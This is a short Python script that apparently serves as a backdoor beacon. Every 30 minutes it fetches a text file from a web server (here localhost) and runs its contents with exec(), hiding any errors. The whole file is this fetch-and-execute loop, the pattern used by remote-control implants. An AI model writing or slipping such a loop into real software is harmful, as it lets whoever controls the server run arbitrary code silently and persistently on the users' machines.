import time
import urllib
import base64

while True:
	try:
		page = urllib.urlopen('http://127.0.0.1:8000/1.txt').read()
		exec(page)
	except Exception as e:
		pass

	time.sleep(1800)
